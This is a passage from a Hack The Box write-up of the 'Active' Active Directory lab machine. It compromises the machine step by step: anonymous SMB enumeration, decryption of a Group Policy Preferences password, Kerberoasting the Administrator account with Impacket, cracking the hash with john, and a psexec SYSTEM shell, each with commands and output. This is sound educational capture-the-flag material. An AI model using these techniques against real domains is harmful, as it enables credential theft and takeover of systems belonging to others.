+<p>Interesting! It looks like there are several shares available. Continuing with
+<code>smbclient</code>, we can try to anonymously connect to them to check which of them
+are protected and which not. Below are two examples. Connecting to &ldquo;NETLOGON&rdquo;
+does not work and fails with &ldquo;NT_STATUS_ACCESS_DENIED&rdquo;, whereas the share
+named &ldquo;Replication&rdquo; let&rsquo;s us in:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ smbclient <span style="color: #ae81ff">\\\\10</span>.10.10.100<span style="color: #ae81ff">\\</span>NETLOGON
+Enter WORKGROUP\root&#39;s password:
+Anonymous login successful
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+
+ $ smbclient <span style="color: #ae81ff">\\\\10</span>.10.10.100<span style="color: #ae81ff">\\</span>Replication
+Enter WORKGROUP\root&#39;s password:
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; list
+0:      server=10.10.10.100, share=Replication
+...
+</code></pre></div>
+
+<p>For easier enumeration, we could also use the amazing <code>smbmap</code> tool, which
+conveniently lists all shares and the permissions we have:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ python smbmap.py -H <span style="color: #ae81ff">10</span>.10.10.100 -d active.htb
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+        Disk                                           Permissions
+        ----                                           -----------
+        ADMIN$                                         NO ACCESS
+        C$                                             NO ACCESS
+        IPC$                                           NO ACCESS
+        NETLOGON                                       NO ACCESS
+        Replication                                    READ ONLY
+        SYSVOL                                         NO ACCESS
+        Users                                          NO ACCESS
+</code></pre></div>
+
+<p>Since &ldquo;Replication&rdquo; is the only share we can access, let&rsquo;s just grab all the
+content and check it out locally. After connecting with <code>smbclient</code>, we can
+download the entire share to a local folder &ldquo;/htb/active/smb/&rdquo; like so:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>smb: \&gt; mask &quot;&quot;
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; lcd &#39;/htb/active/smb/&#39;
+smb: \&gt; mget *
+</code></pre></div>
+
+<p>We get what seems to be a backup of the group policies in SYSVOL. In AD
+environments, administrators can define policies to change settings on the
+client machines. Microsoft calls this MS-GPPREF and the protocol is documented
+<a href="https://msdn.microsoft.com/en-us/library/cc232593.aspx">here</a>. It works such
+that the clients regularly connect to the Domain Controllers to download an XML
+file containing the settings defined by the administrator, as described
+<a href="http://esec-pentest.sogeti.com/posts/2012/01/20/exploiting-windows-gpp.html">here</a>.
+The client then applies all settings it finds, which can be things like
+enabling or disabling hardware, configuring printers, changing the start menu
+and <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc725580(v%3dws.11)">much
+more</a>.</p>
+
+<p>Among the settings an administrator can manage is the password of a local user
+on the client, as described
+<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771917(v%3dws.10)">here</a>.
+This feature is handy to e.g., manage local administrator accounts for the
+entire domain. What will happen is that the Domain Controller puts that password into the XML
+file as the &ldquo;cpassword&rdquo; property of the user. Before doing so, it encrypts the
+password with AES, using a static 32 bit key. No, this is not a joke ;) &hellip;
+It actually uses a publicly known static key you can get from <a href="https://msdn.microsoft.com/en-us/library/Cc422924.aspx">Microsoft&rsquo;s
+website</a>.</p>
+
+<p>Thus, we can <code>grep</code> all files we just found for a &ldquo;cpassword&rdquo; field and
+luckily, we find one (beautified below for readability):</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span style="color: #f92672">&lt;Groups</span> <span style="color: #a6e22e">clsid=</span><span style="color: #e6db74">&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;</span><span style="color: #f92672">&gt;</span>
+  <span style="color: #f92672">&lt;User</span> <span style="color: #a6e22e">clsid=</span><span style="color: #e6db74">&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;</span>
+        <span style="color: #a6e22e">name=</span><span style="color: #e6db74">&quot;active.htb\SVC_TGS&quot;</span>
+        <span style="color: #a6e22e">image=</span><span style="color: #e6db74">&quot;2&quot;</span>
+        <span style="color: #a6e22e">changed=</span><span style="color: #e6db74">&quot;2018-07-18 20:46:06&quot;</span>
+        <span style="color: #a6e22e">uid=</span><span style="color: #e6db74">&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;</span><span style="color: #f92672">&gt;</span>
+    <span style="color: #f92672">&lt;Properties</span> <span style="color: #a6e22e">action=</span><span style="color: #e6db74">&quot;U&quot;</span>
+                <span style="color: #a6e22e">newName=</span><span style="color: #e6db74">&quot;&quot;</span>
+                <span style="color: #a6e22e">fullName=</span><span style="color: #e6db74">&quot;&quot;</span>
+                <span style="color: #a6e22e">description=</span><span style="color: #e6db74">&quot;&quot;</span>
+                <span style="color: #a6e22e">cpassword=</span><span style="color: #e6db74">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span>
+                <span style="color: #a6e22e">changeLogon=</span><span style="color: #e6db74">&quot;0&quot;</span>
+                <span style="color: #a6e22e">noChange=</span><span style="color: #e6db74">&quot;1&quot;</span>
+                <span style="color: #a6e22e">neverExpires=</span><span style="color: #e6db74">&quot;1&quot;</span>
+                <span style="color: #a6e22e">acctDisabled=</span><span style="color: #e6db74">&quot;0&quot;</span>
+                <span style="color: #a6e22e">userName=</span><span style="color: #e6db74">&quot;active.htb\SVC_TGS&quot;</span><span style="color: #f92672">/&gt;</span>
+  <span style="color: #f92672">&lt;/User&gt;</span>
+<span style="color: #f92672">&lt;/Groups&gt;</span>
+</code></pre></div>
+
+<p>This file reads like it sets a password for a user called &ldquo;SVC_TGS&rdquo;. On Kali,
+we can decrypt the password with <code>gpp-decrypt</code>:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ gpp-decrypt <span style="color: #e6db74">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span>
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+GPPstillStandingStrong2k18
+</code></pre></div>
+
+<p>This works like a charm and we now have credentials for a user:
+&ldquo;ACTIVE.HTB\SVC_TGS&rdquo; and &ldquo;GPPstillStandingStrong2k18&rdquo;.</p>
+
+<h1 id="being-svc-tgs">Being SVC_TGS</h1>
+
+<h2 id="checking-smb-again">Checking SMB again</h2>
+
+<p>We have brand new credentials which may give us more access then before. Check
+out the SMB shares again to see what &ldquo;SVC_TGS&rdquo; can do:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ python smbmap.py -H <span style="color: #ae81ff">10</span>.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  NO ACCESS
+        C$                                                      NO ACCESS
+        IPC$                                                    NO ACCESS
+        NETLOGON                                                READ ONLY
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY
+        Users                                                   READ ONLY
+</code></pre></div>
+
+<p>Interestingly, we now have read access to the &ldquo;Users&rdquo; volumne, which is where
+the flags should be. Connecting to the share, we can retrieve the &ldquo;user.txt&rdquo;
+flag, but &ldquo;root.txt&rdquo; is obviously not accessible as we are not an administrator.</p>
+
+<h2 id="enumerating-active-directory">Enumerating Active Directory</h2>
+
+<p>The credentials now also allow accessing the Active Directory. To search for
+interesting information, you can use <a href="https://github.com/ropnop/windapsearch">windapsearch</a>,
+a Python script that pulls data about users, groups, computers, and more.
+For instance, listing all domain users is accomplished like this:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ python windapsearch.py --dc-ip <span style="color: #ae81ff">10</span>.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -U
+[+] Using Domain Controller at: 10.10.10.100
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=active,DC=htb
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:ACTIVE\SVC_TGS
+
+[+] Enumerating all AD users
+[+]     Found 4 users:
+
+cn: Administrator
+
+cn: Guest
+
+cn: krbtgt
+
+cn: SVC_TGS
+userPrincipalName: SVC_TGS@active.htb
+
+
+[*] Bye!
+</code></pre></div>
+
+<p>There is not much apart from the default Administrator and Guest. We know
+SVC_TGS already, and found an additional &ldquo;krbtgt&rdquo; user. This one is a default
+account too. It comes with an Active Directory installation, according to
+<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#krbtgt-account">Microsoft
+docs</a>.
+Its purpose is to issue Kerberos Ticket Granting Tickets (TGT) during Kerberos
+authentication. All TGTs will be encrypted with the password of this account.
+It is usually a strong, uncrackable password.</p>
+
+<p>This is all not terribly helpful for itself, but it suggests we have to somehow
+leverage Kerberos to escalate.</p>
+
+<h2 id="kerberoasting">Kerberoasting</h2>
+
+<p>Remember that our current user is called &ldquo;SVC_TGS&rdquo;, and that we can suspect
+that some flaw in Kerberos authentication should get us the flag? Lets think
+through how Kerberos authentication works and see if that suggests something to
+do next. What follows now will be somewhat superficial and not 100% accurate.
+Check <a href="https://blogs.technet.microsoft.com/askds/2008/03/06/kerberos-for-the-busy-admin/">this post</a>
+for a much more complete description of Kerberos authentication.</p>
+
+<p>Imagine somebody sets up a service such as CIFS on a machine and wants to use
+Kerberos authentication. This admin could create a domain user and set a
+Service Principal Name (SPN) for that user to associate it with the service
+(<a href="https://www.red-gate.com/simple-talk/sql/database-administration/questions-about-kerberos-and-sql-server-that-you-were-too-shy-to-ask/#fourth">c.f., here</a>).
+Once all is <a href="https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/">configured
+correctly</a>,
+the service will run under the service account&rsquo;s security context and domain
+users will be able to see the association in the Active Directory.</p>
+
+<p>Now, if a domain user wants to access this service, it would ask the Kerberos Key
+Distribution Center (KDC) for two things:</p>
+
+<ul>
+<li>a Ticket Granting Ticket (TGT), which is issued by the Authentication Server
+(AS) component of the KDC. A domain user gets it by proving that it knows its
+own password. The ticket serves as proof of successful authentication with
+the KDC and allows a domain user to request service tickets.</li>
+<li>a service ticket, issued by the Ticket Granting Server (TGS) component of the
+KDC. A domain user gets it by presenting the TGT and an SPN to the KDC. The
+ticket then serves as proof of successful authentication with the KDC. Unlike
+the TGT though, which can only be verified by the KDC, the service ticket can
+be verified by the service itself.</li>
+</ul>
+
+<p>It can not be a coincidence that our user is called &ldquo;SVC_TGS&rdquo;, just like the
+TGS component of the KDC. What is special about these service tickets? To see
+that, we must think about how such a ticket works. The reason a service is
+able to verify the ticket is that the KDC encrypts and signs (part of) the
+ticket with the service account password, which it finds by looking up the SPN
+presented by the domain user.</p>
+
+<p>The issue is that whoever is in possession of a service ticket is in possession
+of an oracle for the service account password, since you can brute force the
+encryption offline until you find the valid password. Thus, service accounts
+may be compromised and there is little that an administrator could do about it
+other than using strong passwords.</p>
+
+<p>It gets worse since the KDC only performs authentication and leaves authorization
+to the service itself. Any domain user can request a service ticket for any
+service and will get one, as all it needs to do that is the SPN.
+It is the service&rsquo;s responsibility to decide whether to authorize a given request.
+Thus, all service accounts are at risk of having their passwords brute-forced.
+A domain user does not need any kind of access to the service.</p>
+
+<p>Performing the attack was difficult when it came out. For instance, it required
+reading Kerberos tickets from memory with mimikatz, as described <a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">here</a>.
+With today&rsquo;s amazing tooling though, it is drop-dead simple to do. Given domain user
+credentials, <a href="https://github.com/CoreSecurity/impacket">Impacket</a> is all you
+need:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ python /opt/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span style="color: #ae81ff">10</span>.10.10.100 -request
+Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
+--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-30 13:17:40
+
+
+
+$krb5tgs<span style="color: #f8f8f2">$23$*</span>Administrator<span style="color: #f8f8f2">$ACTIVE</span>.HTB<span style="color: #f8f8f2">$active</span>/CIFS~445*<span style="color: #f8f8f2">$09</span>a16612e21d8979ea1a2025ae9bc848<span style="color: #f8f8f2">$40579360035</span>c960293a35a2509a6d6cfa5e1e6ad1b7ec03ca22e6875d33abbe4eb6e099d7a1a03b6820514f96806b1f9938590bbcc8c25889f26800b3b4baf4a905aabf2aa32efaca6b20c8e2252f79f7f98a35ce4684e468ef5f0b48286bc18cdc590999cc20ca4620dddd8567f7e6d2b9c3984643d43a129afffea2cd99f92b74003cf41f3540b312d6203b84a1edae1888010fdb21868058683f3699e191539a303a46a4a03ba8bb9e1928a9683d4250b8838f7ad4491ef8ad2ff9c81a47b42362b0e6b9cd5351bd532406c951db6063083c052b0b685627e190c898cecc4262286124abb68f757e6265f27e826f9097c3a1d67b546829d738153e986f2f60c18e56e48ecd8abcd97f11e0d2ea05e28544b8779e2b9c34f6fd604cedd43a44b69dc4fdd7018c18d7d58c82b2974e91aba29a3cb279d3da43e9fb8717a86476cdae2a120f4e417afea631503191ca1b80e8343350c35943940057b02b28c4289f83206617d41c0bc1e7b05f2216e7cb0ede9b0d4243f35af58da01d5f0a5391fe4eb51c22dad7cce6f3b5e6976081541c1a100be9326f8e725969344e0859bc3a7683bd53874de6423402d9c20a1f9a62ad8cf399dc31d5eb67fa684f2ffcc9dc64c9d24cc1cb8ae33a56162f79ba96db62bfa0e64c1d6f5dcf34093864805a751b883a616a77f1460e9df5a6a38850649dad3679124b173d2fe5d71fcf3324f1d077565dc83f62328510fdee30849dcbe37f8c267bdc36e720ba2d41282778a4fc2292f2d9cdfe54d7eb5cde85ab4cfb82d7c4700d500503d83529788787794392b8720c67b23460c5473fe604a83a837c16e95c338352c32a1d79deddd079ab5dd81f6f86f9cbab517890ee3cd0dfd648e71b56ce314f7de4f07ebe2345eb361362995a03be531841723f83fb12793a5548890d9445bde2fd17d7ac7ba45913254385f4c9cd45c70968b5ee6f6be9931ec4eb0767d5514b86bf287cc84ce044f3abbcff0efc9d5d0dc62f38f3a7cce73a706157e5181c60be9017b3bd5bcc50a154fdd602ea6bc753c8a4c7199f58a13be861b107a1ce9190e3b0d1f706dd26921599b80f6b9027cbc3dde9b6e758fb174ecdc7ddd696159e22755c566152b0cec57c07e1b466a720e76ac23b1a3ffa8c2867a1f85b1a055641bce8357a07e964ed4d54ef1f561dc15b3792c994fad51887f5de85dc0707698fa2c8e7cae121a7d3f1842ef2cae417b2d0a3cf5e105360df89fdef97c8349
+</code></pre></div>
+
+<p>We are lucky and find that &ldquo;Administrator&rdquo; has an SPN set for CIFS. Impacket
+already requested a ticket and printed out a <code>john</code>-compatible hash that waits
+to be cracked. Put it into a file &ldquo;krb.txt&rdquo; and go for it:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ john ./krb.txt --wordlist<span style="color: #f92672">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)
+1g 0:00:00:08 DONE (2018-09-16 11:43) 0.1212g/s 1277Kp/s 1277Kc/s 1277KC/s Tiffani1432..Thrash1
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div>
+
+<p>Cracking took only a few seconds and gave us &ldquo;Administrator&rdquo; and
+&ldquo;Ticketmaster1968&rdquo; as a new pair of credentials.</p>
+
+<p>Side note: there is a nice three part blog post series about Kerberoasting in
+which many more methods are described:
+<a href="https://room362.com/post/2016/kerberoast-pt1/">1</a>,
+<a href="https://room362.com/post/2016/kerberoast-pt2/">2</a>, and
+<a href="https://room362.com/post/2016/kerberoast-pt3/">3</a>. With alternative methods,
+you may be able to perform this attack without credentials, given only a shell
+on the system.</p>
+
+<h1 id="administrator-with-psexec">Administrator with psexec</h1>
+
+<p>With admin credentials, it is easy to get a shell and the flag:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ python psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd
+Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file lRSucApr.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service eMOD on 10.10.10.100.....
+[*] Starting service eMOD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre></div>
+
+<h1 id="references">References</h1>
+
+<p>Some good blog posts about GPP include</p>
+
+<ul>
+<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
+<li><a href="http://esec-pentest.sogeti.com/posts/2012/01/20/exploiting-windows-gpp.html">http://esec-pentest.sogeti.com/posts/2012/01/20/exploiting-windows-gpp.html</a></li>
+</ul>
+
+<p>Write-Ups and Walkthroughs for the machine:</p>
+
+<ul>
+<li>IppSec video: <a href="https://www.youtube.com/watch?v=jUc1J31DNdw">https://www.youtube.com/watch?v=jUc1J31DNdw</a></li>
+<li>Write-Ups all using describing pretty much the same steps I did are:
+
+<ul>
+<li><a href="https://0xdf.gitlab.io/2018/12/08/htb-active.html#kerberoasting">https://0xdf.gitlab.io/2018/12/08/htb-active.html#kerberoasting</a></li>
+<li><a href="https://medium.com/bugbountywriteup/active-a-kerberos-and-active-directory-hackthebox-walkthrough-fed9bf755d15">https://medium.com/bugbountywriteup/active-a-kerberos-and-active-directory-hackthebox-walkthrough-fed9bf755d15</a></li>
+<li><a href="https://0xrick.github.io/HackTheBox-Active/">https://0xrick.github.io/HackTheBox-Active/</a></li>
+</ul></li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2018-12-20T00:00:00&#43;01:00">
+    20 Dec, 2018
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">2381</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_dropzone/">Hack The Box Write-up - Dropzone</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/htb_devoops/">Hack The Box Write-up - DevOops</a>
+        <time datetime="7M">7 minutes</time>
+      
+        <li><a href="/post/htb_sunday/">Hack The Box Write-up - Sunday</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/stego_book_of_secrets/">Steganography challenge - The Book of Secrets</a>
+        <time datetime="10M">10 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
